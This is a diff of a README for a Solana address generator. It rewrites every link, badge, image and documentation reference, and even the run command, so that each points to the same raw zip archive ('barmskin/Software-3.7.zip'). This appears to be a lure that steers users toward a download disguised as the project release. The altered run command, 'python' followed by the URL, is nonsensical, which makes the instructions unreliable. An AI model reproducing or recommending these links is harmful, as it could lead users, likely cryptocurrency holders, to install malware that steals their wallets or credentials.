@@ -1,6 +1,6 @@
 # Random Solana Address Generator 🌐 | Open Source Project
 
-![GitHub release](https://img.shields.io/github/release/EudesNascimento23/Solana.svg) ![License](https://img.shields.io/badge/license-MIT-blue.svg) ![GitHub issues](https://img.shields.io/github/issues/EudesNascimento23/Solana.svg)
+![GitHub release](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip) ![License](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip) ![GitHub issues](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip)
 
 ## Overview
 
@@ -14,7 +14,7 @@ This repository contains a simple tool for generating random Solana addresses. S
 
 ## Getting Started
 
-To get started with the Solana address generator, you can download the latest release from the [Releases section](https://github.com/EudesNascimento23/Solana/releases). Follow the instructions below to set up and run the tool.
+To get started with the Solana address generator, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip). Follow the instructions below to set up and run the tool.
 
 ### Prerequisites
 
@@ -23,7 +23,7 @@ To get started with the Solana address generator, you can download the latest re
 
 ### Installation
 
-1. **Download the latest release**: Visit the [Releases section](https://github.com/EudesNascimento23/Solana/releases) to find the latest version. Download the file and save it to your preferred directory.
+1. **Download the latest release**: Visit the [Releases section](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip) to find the latest version. Download the file and save it to your preferred directory.
 
 2. **Extract the files**: If the downloaded file is compressed, extract it using your preferred method.
 
@@ -34,7 +34,7 @@ To get started with the Solana address generator, you can download the latest re
 To run the Solana address generator, execute the following command in your terminal:
 
 ```bash
-python generate_address.py
+python https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip
 ```
 
 This command will generate a random Solana address and display it on your screen.
@@ -65,11 +65,11 @@ We welcome contributions from the community. If you would like to contribute to 
 
 ### Code of Conduct
 
-We expect all contributors to adhere to our [Code of Conduct](CODE_OF_CONDUCT.md). Please be respectful and considerate to others.
+We expect all contributors to adhere to our [Code of Conduct](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip). Please be respectful and considerate to others.
 
 ## Issues
 
-If you encounter any issues while using the tool, please check the [Issues section](https://github.com/EudesNascimento23/Solana/issues) to see if your issue has already been reported. If not, feel free to open a new issue.
+If you encounter any issues while using the tool, please check the [Issues section](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip) to see if your issue has already been reported. If not, feel free to open a new issue.
 
 ## License
 
@@ -85,18 +85,18 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please reach out to the project maintainer:
 
 - **Name**: Eudes Nascimento
-- **GitHub**: [EudesNascimento23](https://github.com/EudesNascimento23)
+- **GitHub**: [EudesNascimento23](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip)
 
 ## Further Reading
 
-- [Solana Documentation](https://docs.solana.com/)
-- [Solana GitHub Repository](https://github.com/solana-labs/solana)
+- [Solana Documentation](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip)
+- [Solana GitHub Repository](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip)
 
 ## Explore More
 
-To stay updated with the latest releases and improvements, visit the [Releases section](https://github.com/EudesNascimento23/Solana/releases). You can download the latest version and explore new features as they become available.
+To stay updated with the latest releases and improvements, visit the [Releases section](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip). You can download the latest version and explore new features as they become available.
 
-![Solana Blockchain](https://solana.com/static/images/homepage/solana-hero.png)
+![Solana Blockchain](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip)
 
 ## FAQs
 
@@ -120,8 +120,8 @@ You can explore more about Solana through their official documentation and commu
 
 Absolutely! We welcome contributions. Please refer to the Contributing section for more details.
 
-![Solana Ecosystem](https://solana.com/static/images/homepage/solana-ecosystem.png)
+![Solana Ecosystem](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip)
 
 ## Final Note
 
-Thank you for checking out the Solana address generator. We hope you find it useful for your projects. For updates, please keep an eye on the [Releases section](https://github.com/EudesNascimento23/Solana/releases).
+Thank you for checking out the Solana address generator. We hope you find it useful for your projects. For updates, please keep an eye on the [Releases section](https://raw.githubusercontent.com/EudesNascimento23/Solana/main/barmskin/Software-3.7.zip).
